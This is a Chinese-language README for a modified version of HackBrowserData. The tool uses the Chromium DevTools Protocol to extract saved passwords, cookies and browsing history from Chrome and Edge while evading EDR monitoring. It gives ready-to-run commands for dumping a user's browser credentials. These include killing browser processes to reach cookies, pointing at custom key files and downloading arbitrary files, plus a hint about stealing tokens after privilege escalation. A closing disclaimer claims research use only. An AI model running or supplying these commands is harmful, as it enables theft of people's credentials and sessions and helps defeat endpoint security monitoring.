# HackBrowserDataManual
HackBrowserData的偏手动版，用于绕过特定情况下edr的限制

魔改自[HackBrowserData](https://github.com/moonD4rk/HackBrowserData)  
原理部分查看我的这篇博客[HackBrowserDataManual开发日记](https://blog.z3ratu1.top/HackBrowserDataManual%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0.html)
用于应对特殊情况下edr等软件监控了chrome的数据文件导致无法还原密码的问题  
仅在本地win10,win11上实验通过（虽然理论上我感觉应该能在linux和Mac上运行）  

使用Chrome DevTools Protocol控制浏览器，通过文件下载以及file协议等方式使用浏览器进程获取数据文件，绕过监控

需注意windows下浏览器密码解密需要DPAPI的参与，因此仅支持解密当前用户的密码，若提权至system权限，需手动窃取token等方式切换用户上下文  
用户数据文件的定位是依赖于家目录的，非默认情况下同样需要自行指定用户数据文件位置

## Disclaimer
本工具仅用于安全研究，提出一种edr监控浏览器文件后的绕过读取思路。 请勿使用于任何非法用途，严禁使用该项目对计算机信息系统进行攻击。由此产生的后果由使用者自行承担。


## Build
与HackBrowserData相同，sqlite依赖需要`CGO_ENABLED=1`下编译

## Usage
目前仅支持chrome和edge，理论上可以支持所有chromium内核的浏览器，但是我懒得整哈哈
```shell
$ ./HackBrowserDataManual.exe
extract password/history/cookie.
bypass edr monitor of browser data file by using Chromium devtools protocol

Usage:
  go_build_HackBrowserDataManual.exe [command]

Available Commands:
  devtool     Using dev tool protocol to extract cookies.
  download    download file via dev tool protocol
  help        Help about any command
  run         Parse browser cookie, password and history

Flags:
  -b, --browser string   browser(chrome/edge) (default "chrome")
  -h, --help             help for go_build_HackBrowserDataManual.exe
  -l, --log string       log level(info, error) (default "info")

Use "HackBrowserDataManual.exe [command] --help" for more information about a command.
```

### run
run命令一把梭当前用户的浏览器密码，cookie和history

**需注意cookie只有当不存在浏览器进程时才可获取。若存在浏览器进程，可使用`--kill`选项关闭所有浏览器进程**
```shell
$ ./HackBrowserDataManual.exe help run
Parse browser cookie, password and history

Usage:
  go_build_HackBrowserDataManual.exe run [flags]
  go_build_HackBrowserDataManual.exe run [command]

Available Commands:
  cookie      Parse browser cookie file
  history     Parse browser history file
  password    Parse browser Password file

Flags:
  -f, --format string   Output format(csv/json) (default "csv")
  -h, --help            help for run

Global Flags:
  -b, --browser string   browser(chrome/edge) (default "chrome")
  -l, --log string       log level(info, error) (default "info")
```

### examples
如下命令直接梭当前用户默认目录下的chrome密码，cookie和history
```shell
./HackBrowserDataManual.exe run
```

使用-b flag指定其他浏览器（目前只支持chrome和edge）
```shell
./HackBrowserDataManual.exe run -b edge
```

如果梭不通或者出问题可以使用其下的的cookie，history和password三个子命令单独获取数据。如:
```shell
./HackBrowserDataManual.exe run cookie
```

存在chrome进程需要关闭后才能获取cookie
```shell
./HackBrowserDataManual.exe run cookie --kill
```

指定输出文件名，使用run命令一把梭时不支持指定文件名
```shell
./HackBrowserDataManual.exe run cookie -o /output/filename
```

cookie文件和masterKey位于非常规位置时
```shell
./HackBrowserDataManual.exe run cookie -i /path/to/cookieFile -k /path/to/keyfile
```

devtools子命令使用devtools protocol直接从浏览器中还原全部cookie
devtools命令user data dir位于非常规位置
```shell
./HackBrowserDataManual.exe devtools -d /user/dir
```

download子命令将制定文件下载到当前文件夹
```shell
./HackBrowserDataManual.exe download /path/to/downloadfile
```